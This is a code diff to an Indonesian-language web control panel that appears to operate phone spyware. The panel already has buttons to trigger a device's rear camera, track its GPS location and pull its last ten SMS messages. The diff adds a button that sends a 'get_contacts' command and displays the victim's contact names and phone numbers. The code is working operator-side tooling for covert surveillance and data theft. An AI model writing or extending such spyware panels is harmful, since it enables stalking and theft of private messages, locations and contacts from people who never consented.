@@ -100,6 +100,7 @@
                 <button class="action-btn" onclick="bukaModal('camera_back')">📷 Kamera Belakang</button>
                 <button class="action-btn" onclick="bukaModal('gps')">📍 Lacak GPS</button>
                 <button class="action-btn" onclick="bukaModal('sms')">📩 Ambil SMS</button>
+                <button class="action-btn" onclick="bukaModal('contacts')">👥 Ambil Kontak</button>
             </div>
         </div>
     </div>
@@ -166,9 +167,9 @@
             document.getElementById('myModal').style.display = 'flex';
             document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">⏳ Mengambil data...</div>';
             
-            if (type === 'gps' || type === 'sms') {
-                document.getElementById('modal-title').innerText = type === 'gps' ? '📍 Lokasi GPS' : '📩 10 SMS Terakhir';
-                kirimPerintah(type === 'gps' ? 'get_gps' : 'get_sms');
+            if (type === 'gps' || type === 'sms' || type === 'contacts') {
+                document.getElementById('modal-title').innerText = type === 'gps' ? '📍 Lokasi GPS' : (type === 'sms' ? '📩 10 SMS Terakhir' : '👥 Daftar Kontak');
+                kirimPerintah(type === 'gps' ? 'get_gps' : (type === 'sms' ? 'get_sms' : 'get_contacts'));
                 if(intervalId) clearInterval(intervalId);
                 intervalId = setInterval(() => { cekTeks(type); }, 2000);
             } else {
@@ -198,6 +199,11 @@
                     clearInterval(intervalId);
                     data.sms.forEach(sms => {
                         html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + sms.address + ': ' + sms.body + '</div>';
+                    });
+                } else if(type === 'contacts' && data.contacts && data.contacts.length > 0) {
+                    clearInterval(intervalId);
+                    data.contacts.forEach(c => {
+                        html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + c.name + ' - ' + c.phone + '</div>';
                     });
                 }
                 if (html !== '') document.getElementById('modal-body').innerHTML = html;
